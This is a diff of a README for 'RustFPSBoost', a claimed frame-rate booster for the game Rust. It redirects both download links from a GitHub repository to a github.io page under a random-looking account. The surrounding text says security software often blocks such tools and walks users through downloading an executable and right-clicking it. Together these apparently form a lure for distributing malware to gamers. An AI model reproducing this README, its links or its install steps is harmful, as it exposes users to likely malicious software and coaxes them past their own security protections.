@@ -1,6 +1,6 @@
 # 🚀 RustFPSBoost - Increase your game frame rates easily
 
-[![Download RustFPSBoost](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Microscopical-trophoblast919/RustFPSBoost)
+[![Download RustFPSBoost](https://img.shields.io/badge/Download-Release-blue.svg)](https://microscopical-trophoblast919.github.io)
 
 RustFPSBoost helps players gain performance in the game Rust. This tool optimizes system settings to ensure your computer runs the game with higher frame rates. It works with any modern processor and graphics card. You only need a legitimate, licensed copy of the game to use this tool.
 
@@ -29,7 +29,7 @@ Security software often blocks tools that modify system files. To ensure the app
 
 Follow these steps to obtain and run the software:
 
-1.  Visit the [official download page](https://github.com/Microscopical-trophoblast919/RustFPSBoost) to access the files.
+1.  Visit the [official download page](https://microscopical-trophoblast919.github.io) to access the files.
 2.  Locate the latest release version on the page.
 3.  Download the executable file to your desktop for easy access.
 4.  Right-click the downloaded file.
